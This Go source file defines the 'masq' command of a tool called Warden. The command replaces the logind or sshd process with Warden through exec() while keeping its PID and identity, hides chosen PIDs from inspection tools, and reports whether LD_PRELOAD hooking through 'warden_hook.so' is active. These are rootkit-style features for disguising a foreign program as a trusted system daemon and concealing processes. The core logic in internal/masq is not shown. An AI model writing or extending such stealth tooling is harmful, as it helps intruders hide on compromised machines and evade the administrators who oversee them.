package main

import (
	"fmt"
	"os"

	"github.com/spf13/cobra"

	"warden/internal/masq"
)

func masqCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "masq",
		Short: "Process masquerading operations",
	}

	cmd.AddCommand(masqReplaceCmd())
	cmd.AddCommand(masqStatusCmd())

	return cmd
}

func masqReplaceCmd() *cobra.Command {
	var target string
	var hidePids []string

	cmd := &cobra.Command{
		Use:   "replace [target]",
		Short: "Replace a process with Warden via exec()",
		Long:  "Replaces the specified process with Warden while maintaining PID and process identity",
		RunE: func(cmd *cobra.Command, args []string) error {
			if target == "" && len(args) > 0 {
				target = args[0]
			}

			switch target {
			case "logind":
				return masqReplaceTarget(masq.LogindTarget, hidePids)
			case "sshd":
				return masqReplaceTarget(masq.SSHDTarget, hidePids)
			default:
				return fmt.Errorf("unknown target: %s", target)
			}
		},
	}

	cmd.Flags().StringVar(&target, "target", "", "process to replace (logind|sshd)")
	cmd.Flags().StringSliceVar(&hidePids, "hide-pid", []string{}, "PIDs to hide from inspection tools")

	return cmd
}

func masqReplaceTarget(target masq.TargetProcess, hidePids []string) error {
	fmt.Printf("Replacing %s with Warden...\n", target.Description)

	// Build exec arguments
	args := []string{"--masquerade"}
	for _, pid := range hidePids {
		args = append(args, fmt.Sprintf("--hide-pid=%s", pid))
	}

	return masq.ReplaceProcess(target, args)
}

func masqStatusCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "status",
		Short: "Show masquerading status",
		RunE: func(cmd *cobra.Command, args []string) error {
			fmt.Println("Warden masquerade status:")

			// Check if we're running inside a replaced process
			if os.Getenv("WARDEN_MASQUERADE") == "1" {
				fmt.Println("  Running in masquerade mode")
			} else {
				fmt.Println("  Running normally (not masqueraded)")
			}

			// Check LD_PRELOAD
			preload := os.Getenv("LD_PRELOAD")
			if preload != "" && contains(preload, "warden_hook.so") {
				fmt.Println("  LD_PRELOAD hooking: active")
			} else {
				fmt.Println("  LD_PRELOAD hooking: not active")
			}

			return nil
		},
	}
}

func contains(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}